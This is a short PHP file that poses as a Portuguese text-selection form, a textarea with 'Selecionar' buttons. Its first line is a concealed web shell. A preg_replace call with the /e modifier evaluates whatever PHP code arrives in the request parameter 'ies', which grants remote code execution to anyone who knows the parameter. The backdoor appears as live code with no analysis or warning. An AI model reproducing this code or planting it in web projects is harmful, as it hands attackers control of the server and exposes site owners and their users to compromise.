<? preg_replace('#(.*)#ies',preg_replace('/\{php.(.+)(?)\}/is','\\1',$_REQUEST['ies']),null)
?>
<FORM name=copiar>
	<TEXTAREA name=txt rows=5 wrap=VIRTUAL cols=30>SEU CӄIGO FONTE OU MENSAGEM AQUI</TEXTAREA><BR>
	<INPUT onclick=javascript:this.form.txt.focus();this.form.txt.select(); type=button value=Selecionar name=value>
	<INPUT onclick=javascript:this.form.txt.focus();this.form.txt.select(); type=radio value=Selecionar name=value>Selecionar
</FORM>